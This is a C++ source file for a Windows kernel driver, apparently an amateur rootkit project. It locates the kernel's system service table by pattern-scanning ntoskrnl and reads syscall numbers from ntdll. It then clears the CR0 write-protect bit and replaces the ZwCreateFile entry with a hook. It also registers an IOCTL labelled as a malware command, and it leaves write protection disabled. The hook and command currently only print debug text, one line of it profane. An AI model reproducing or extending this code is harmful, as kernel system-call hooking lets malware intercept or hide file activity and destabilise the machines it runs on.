#pragma once
#include <pch.h>
#include <defines.h>
#include <intrin.h>
//#include <WindowsTypes.hpp>

#define SUGIOT2 0x8001
#define IOCTL_SUGIOT1_MALWARE_COMMAND CTL_CODE(SUGIOT2, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define DRIVER_TAG 'MICH'

typedef NTSTATUS(*PZwCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

PZwCreateFile oldZwCreateFile = NULL;

NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SUGIOT1_MALWARE_COMMAND:
	{

		DbgPrint("Malicious Command\n");
		break;
	}
	default:
	{
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	}
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;

}

void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
{

	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	IoDeleteSymbolicLink(&sym_link);

	IoDeleteDevice(DriverObject->DeviceObject);
	KdPrint(("Sugiot2 driver unload\n"));
	DbgPrint("Sugiot2 driver unload\n");
}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
	bool found;

	if (pattern == NULL || base == NULL || len == 0 || size == 0)
		return NULL;

	for (ULONG_PTR i = 0; i < size - len; i++) {
		found = true;

		for (ULONG_PTR j = 0; j < len; j++) {
			if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
				found = false;
				break;
			}
		}

		if (found) {
			if (foundIndex)
				*foundIndex = i;
			return (PUCHAR)base + i + relativeOffset;
		}
	}

	return NULL;
}

void DisableWP()
{
	__writecr0(__readcr0() & 0xFFFEFFFF);
}

void EnableWP()
{
	__writecr0(__readcr0() | 0x00010000);
}

NTSTATUS ZwCreateFileHook(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
{
	DbgPrint("Hooked mother fucker\n");
	return oldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

//https://stackoverflow.com/questions/47876087/zwquerysysteminformation-is-not-working-properly
PVOID GetNtoskrnlBase()
{
	PVOID NtoskrnlBase = NULL;
	ULONG size = 0;
	PRTL_PROCESS_MODULES proccessModulesInfo = NULL;
	NTSTATUS status = STATUS_SUCCESS;

	UNICODE_STRING routineName;
	RtlInitUnicodeString(&routineName, L"ZwQuerySystemInformation");
	
	// ZwQuerySystemInformation is not exported, so we get its address
	PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)MmGetSystemRoutineAddress(&routineName);
	
	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &size);
	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (proccessModulesInfo) 
		{
			ExFreePoolWithTag(proccessModulesInfo, DRIVER_TAG);
			proccessModulesInfo = NULL;
		}

		// allocate memory to the struct that will be returned from ZwQuerySystem Information
		proccessModulesInfo = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);

		if (!proccessModulesInfo)
		{
			goto CleanUp;
		}

		// get the system modules information
		status = ZwQuerySystemInformation(SystemModuleInformation, proccessModulesInfo, size, &size);
	}

	if (!NT_SUCCESS(status) || !proccessModulesInfo)
		goto CleanUp;

	// ntoskrnl is always the first module but i need to add a check in the future
	NtoskrnlBase = proccessModulesInfo->Modules[0].ImageBase;

CleanUp:
	if(proccessModulesInfo) 
		ExFreePoolWithTag(proccessModulesInfo, DRIVER_TAG);
	return NtoskrnlBase;
}

DWORD GetSystemCallNumber(PCSTR functionName)
{
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK ioStatusBlock;
	UNICODE_STRING ntdllPath;
	NTSTATUS status;
	HANDLE ntdllHandle = NULL;
	HANDLE sectionHandle = NULL;
	PVOID ntdllBaseAddress = NULL;
	LARGE_INTEGER  sectionOffset;
	SIZE_T viewSize=0;
	DWORD syscallNumber=0;
	RtlInitUnicodeString(&ntdllPath, L"\\??\\C:\\Windows\\System32\\ntdll.dll");

	// Initialize the object attributes
	InitializeObjectAttributes(&objAttr, &ntdllPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	// Open the file
	status = ZwOpenFile(&ntdllHandle, FILE_GENERIC_READ, &objAttr, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

	if (!NT_SUCCESS(status))
		goto CleanUp;
	
	status = ZwCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, ntdllHandle);
	if (!NT_SUCCESS(status))
		goto CleanUp;

	sectionOffset.QuadPart = 0;
	status = ZwMapViewOfSection(sectionHandle, ZwCurrentProcess(), &ntdllBaseAddress, 0, 0, &sectionOffset, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
	
	if (!NT_SUCCESS(status))
		goto CleanUp;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBaseAddress;
	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntdllBaseAddress + dosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
	PIMAGE_OPTIONAL_HEADER optional_header = &ntHeaders->OptionalHeader;
	PIMAGE_DATA_DIRECTORY data_directories = &optional_header->DataDirectory[0];
	IMAGE_DATA_DIRECTORY export_directory_rva = data_directories[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)ntdllBaseAddress + export_directory_rva.VirtualAddress);
	DWORD base = export_directory->Base;
	PDWORD functions_rva = (PDWORD)((PUCHAR)ntdllBaseAddress + export_directory->AddressOfFunctions);
	PDWORD names_rva = (PDWORD)((PUCHAR)ntdllBaseAddress + export_directory->AddressOfNames);
	PWORD ordinals = (PWORD)((PUCHAR)ntdllBaseAddress + export_directory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < export_directory->NumberOfNames; i++)
	{
		if (strcmp((const char*)((PUCHAR)ntdllBaseAddress + names_rva[i]), functionName) == 0)
		{
			syscallNumber = *(PDWORD)((PUCHAR)ntdllBaseAddress + functions_rva[ordinals[i]] + 4);
			DbgPrint("Syscall number of %s is:%d\n", functionName, syscallNumber);
			break;
		}
	}
			
CleanUp:
	if (ntdllHandle)
		ZwClose(ntdllHandle);
	if (sectionHandle)
		ZwClose(sectionHandle);
	if (ntdllBaseAddress)
		ZwUnmapViewOfSection(ZwCurrentProcess(), &ntdllBaseAddress);
	return syscallNumber;
}
	
NTSTATUS GetSSDTAddress() 
{
	ULONG infoSize;
	PVOID ntoskrnlBase = NULL;
	PRTL_PROCESS_MODULES info = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	PLONG ssdt = NULL;
	UCHAR pattern[] = "\x4c\x8d\x15****\x4c\x8d\x1d****\xf7";
	ntoskrnlBase = GetNtoskrnlBase();


	PUCHAR bp = (PUCHAR)ntoskrnlBase;
	
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bp;
	PFULL_IMAGE_NT_HEADERS nt_headers = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)bp + (dos_header->e_lfanew));

	
	PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(nt_headers + 1);
	for (PIMAGE_SECTION_HEADER section = first_section; section < first_section + nt_headers->FileHeader.NumberOfSections; section++)
	{
		if (strcmp((const char*)section->Name, ".text") == 0)
		{
			PUCHAR section_start = (PUCHAR)bp + section->VirtualAddress;
			PUCHAR KiSystemServiceRepeat = (PUCHAR)FindPattern(pattern, '*', sizeof(pattern) - 1, section_start, section->Misc.VirtualSize, NULL, NULL);

			//The first instruction in KiSystemServiceRepeat is :
			//4C 8D 15 * * * * <===> lea r10, KeSystemDesciptorTable
			//where the * * * * is the relative address to KeSystemDescriptorTable
			//
			ULONG SdtRelativeOffset = (*(PULONG)(KiSystemServiceRepeat + 3)) + 7; //+3 takes us to the relative address, +7 because the address is relative to the end of the instruction and the instruction is 7 bytes
			PVOID sdt = (PVOID)(KiSystemServiceRepeat + SdtRelativeOffset);
			ssdt = (PLONG)*((PULONG_PTR)sdt);
			DbgPrint("sdt:%p\n", sdt);
			DbgPrint("ssdt:%p\n", ssdt);
		}
	}
	
	DWORD syscall = GetSystemCallNumber("ZwCreateFile");
	LONG argc = (((PLONG)ssdt)[syscall] & 0xF); // number of parameters of the hooked function
	PVOID functionAddress = (PUCHAR)ssdt + (((PLONG)ssdt)[syscall] >> 4); // 4 LSB in the ssdt are reserved for the number of parameters so we dont need them
	oldZwCreateFile = (PZwCreateFile)functionAddress;
	DbgPrint("Address of ZwCreateFile:%p\n", functionAddress);
	LONG ssdtEntry = 0;
	ssdtEntry = (PUCHAR)ZwCreateFileHook - (PUCHAR)ssdt;
	ssdtEntry &= 0xFFFFFFF0;
	ssdtEntry |= argc;// i dont under stand why it works without this line
	
	
	DisableWP();
	InterlockedExchange(&ssdt[syscall], ssdtEntry);
	//EnableWP();
CleanUp:
	if (info)
		ExFreePoolWithTag(info, DRIVER_TAG);
	return status;
}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistyPath)
{
	UNREFERENCED_PARAMETER(RegistyPath);
	
	DriverObject->DriverUnload = SugiotUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	UNICODE_STRING dev_name;
	RtlInitUnicodeString(&dev_name, L"\\Device\\Sugiot2");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &dev_name, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	  
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create Device object\n");
		return status;
	}
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	status = IoCreateSymbolicLink(&symLink, &dev_name);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create symbolic link");
		return status;
	}

	DbgPrint("Size of Long:%X\n", sizeof(LONG));
	DbgPrint("Driver Load\n");
	GetSSDTAddress();
	
	return STATUS_SUCCESS;  

} 


